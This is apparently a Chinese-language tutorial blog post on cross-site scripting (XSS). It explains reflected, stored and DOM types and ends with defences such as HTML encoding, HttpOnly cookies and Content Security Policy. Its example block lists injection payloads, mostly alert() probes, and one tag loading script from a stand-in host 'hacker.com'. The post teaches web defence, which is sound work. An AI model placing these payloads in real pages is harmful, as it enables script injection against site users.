---
title: web安全-XSS
date: 2020-10-11 16:47:23
categories: web安全
tags: [web安全]
---

### 一起学习了解一下 web安全相关的知识

### XSS（Cross Site Scripting）跨站脚本攻击

使用注入的js,html代码导致页面样式出入，功能缺失，植入广告，甚至用户信息泄露的问题

### XSS 类型
- 基于反射的XSS攻击
比如访问一个搜索商品的，如果搜索没有内容，页面显示 XXX 不存在
1. 用户输入带有参数的url => http://a.com?name=<script>alert(123)</script>
2. js 处理 url 中 name 的值 <script>alert(123)</script> 字符串
3. 直接显示商品名称 <script>alert(123)</script> 写入html 进行页面渲染 js被执行

- 基于存储型的XSS攻击
1. 用户输入带有参数的url => http://a.com?name=<script>alert(123)</script>
2. js 处理 url 中 name 的值 <script>alert(123)</script> 字符串
3. 数据通过后端存储之后，回显的时候展示返回name值
4. 直接显示商品名称 <script>alert(123)</script> 写入html 进行页面渲染 js被执行

- DOM XSS
document.write, eval, img 等等

### 举例
<!-- html节点注入 -->
```html
<section>
  <script>
    alert(1);
  </script>
</section>
```

<!-- DOM注入 -->
```html
<img src='/img.png' onerror='alert(1);'> 
<body onload='alert("XSS")'>
<link rel="stylesheet" href="javascript:alert('XSS');">
<table background="javascript:alert('XSS')">
<div style="background-image: url(javascript:alert('XSS'))">
<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
```

### 安全措施
- 输入的内容需要做过滤或者转译（HTMLEncode）
- 避免直接在cookie 中泄露用户隐私 http only
- 采用POST 而非GET 提交表单
- Content Security Policys

